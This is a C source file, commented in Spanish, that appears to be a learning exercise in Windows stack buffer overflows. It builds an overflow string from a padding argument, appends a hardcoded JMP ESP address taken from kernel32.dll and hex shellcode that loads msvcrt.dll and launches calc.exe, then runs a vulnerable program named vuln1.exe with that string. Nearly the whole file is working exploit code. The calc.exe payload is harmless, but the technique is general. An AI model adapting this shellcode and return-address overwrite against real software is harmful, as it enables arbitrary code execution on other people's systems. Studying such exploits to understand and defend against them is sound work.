#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main (int argc,char **argv)
{

	int x = 0;

    // Creamos el str evilbuffer que llenaremos con 64 bytes introduciendo por argumento "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ")
    char evilbuffer[1024];


   // Se compila shellcode.c y le hacemos xxd -i a shellcode.obj (que está precompilado) para verlo en formato hexadecimal
   // Buscamos la string que comienza por x55, x8b, que es donde empieza el push ebp del call que hemos hecho a calc.exe
    char shellcode[]="\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3";
   
    // Con findjmp.exe kernel32.dll ESP sacamos el offset (se introduce al revés)
    char offset[]="\x7b\x46\x86\x7c"; 

	if (argc != 2)
	{
		printf("Introduce un argumento");
		exit (1);
	}

    // Copiamos el contenido del argumento al str buffer
    while (argv[1][x] != '\0')
	{
		evilbuffer[x] = argv[1][x];
		x++;
	}
	evilbuffer[x] = '\0';


    // Concatenamos la str offset tras la str evilbuffer para introducir en el punto exacto del return la dirección del offset ESP de kernel32.dll (vulnerabilidad) almacenado en la str offset
    // A continuación, concatenamos nuestro shellcode con la instrucción a ejecutar (en este caso, calc.exe)
    strcat(evilbuffer,offset);
    strcat(evilbuffer,shellcode);
   
    argv[0] = "vuln1";
    argv[1] = evilbuffer;
    argv[2] = NULL;
   
   // Ejecutamos el programa vulnerable pasándole como argumento el argv
    execv ("vuln1.exe",argv);
}